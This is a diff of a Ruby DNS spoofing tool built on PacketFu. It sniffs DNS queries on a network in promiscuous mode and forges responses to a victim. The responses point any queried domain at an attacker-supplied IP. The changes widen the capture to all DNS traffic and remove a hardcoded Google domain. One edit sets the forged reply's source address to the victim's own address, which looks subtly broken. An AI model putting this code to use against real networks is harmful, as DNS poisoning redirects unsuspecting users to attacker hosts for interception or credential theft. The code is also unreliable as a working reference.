@@ -72,10 +72,8 @@ class DNSSpoof < Spoof
         @running = true
         
         # Only capture DNS packets
-        filter = "udp and port 53 and src host " + @victim_ip
-        
-        puts filter
-        
+        filter = "udp and port 53"
+                
         cap = PacketFu::Capture.new(:iface => @interface, :start => true,
                         :promisc => true, :filter => filter, :save => true)
                         
@@ -158,32 +156,24 @@ class DNSSpoof < Spoof
                                 :udp_dst => @packet.udp_src)
         udp_packet.eth_daddr = @victim_mac
         udp_packet.ip_daddr = @victim_ip
-        udp_packet.ip_saddr = @packet.ip_daddr
+        udp_packet.ip_saddr = @packet.ip_saddr
         udp_packet.payload = @packet.payload[0, 2]
         
         udp_packet.payload += "\x81" + "\x80" + "\x00" + "\x01" + "\x00" + "\x01"
         udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"
         
-        # For www.google.ca
-        #if @domain_name == "www.google.ca" then
-            @domain_name.split('.').each do |part|
-                udp_packet.payload += part.length.chr
-                udp_packet.payload += part
-            end # @domain_name.split('.').each do |part|
+        @domain_name.split('.').each do |part|
+            udp_packet.payload += part.length.chr
+            udp_packet.payload += part
+        end # @domain_name.split('.').each do |part|
        
-            udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01"
-            udp_packet.payload += "\xc0" + "\x0c"
-            udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"
-            # ttl
-            udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x83"
-            # data length
-            udp_packet.payload += "\x00" + "\x04"
-        #end # if @domain_name == "www.google.ca" then
-        
-        #-----------------------------------------------------------------------
-        #TODO:
-        # Need to do create packet for www.google.com
-        #-----------------------------------------------------------------------
+        udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01"
+        udp_packet.payload += "\xc0" + "\x0c"
+        udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"
+        # ttl
+        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x83"
+        # data length
+        udp_packet.payload += "\x00" + "\x04"
         
         # Address
         spoof_ip = @spoof_ip.split('.')
